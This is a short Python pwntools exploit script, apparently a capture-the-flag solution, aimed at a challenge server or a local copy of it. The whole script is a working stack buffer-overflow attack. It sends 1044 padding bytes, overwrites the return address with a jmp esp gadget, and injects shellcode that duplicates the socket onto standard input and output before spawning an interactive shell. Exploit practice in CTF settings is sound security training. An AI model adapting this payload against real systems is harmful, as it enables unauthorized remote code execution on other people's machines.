# Author: ghsi10

from pwn import *

local = True

if local:
    p = remote('localhost', 9999)
else:
    p = remote('challenge.ctf.games', 32562)

jmp_esp = 0x080492e2

shellcode = shellcraft.linux.dup2(4, 0)
shellcode += shellcraft.linux.dup2(4, 1)
shellcode += shellcraft.linux.dup2(4, 2)
shellcode += shellcraft.linux.sh()

payload = b"A"*1044
payload += p32(jmp_esp)
payload += asm(shellcode)

p.sendlineafter(b"What would you like to say?:", payload)
p.interactive()